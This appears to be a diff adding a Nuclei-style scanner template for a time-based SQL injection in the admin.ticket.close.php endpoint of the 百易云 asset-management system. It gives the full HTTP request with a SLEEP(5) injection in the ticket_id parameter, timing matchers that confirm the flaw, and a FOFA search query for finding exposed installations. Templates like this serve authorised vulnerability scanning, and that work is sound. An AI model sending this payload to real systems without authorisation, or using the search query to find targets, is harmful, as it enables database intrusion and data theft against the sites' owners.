@@ -1,0 +1,35 @@
+id: baiyishequ-wuser-admin-sqli
+info:
+  name: 百易云资产管理运营系统 admin.ticket.close.php - sqli
+  author: leadlife
+  severity: high
+  description: 百易云资产管理运营系统 admin.ticket.close.php 接口下存在sql注入漏洞
+  reference: 
+    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E7%99%BE%E6%98%93%E4%BA%91%E8%B5%84%E4%BA%A7%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%99%BE%E6%98%93%E4%BA%91%E8%B5%84%E4%BA%A7%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fadmin.ticket.close.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="不要着急，点此"
+  tags: 2025,sqli,baiyishequ
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /wuser/admin.ticket.close.php?ticket_id=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(5)))OKTO) HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'weui')
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
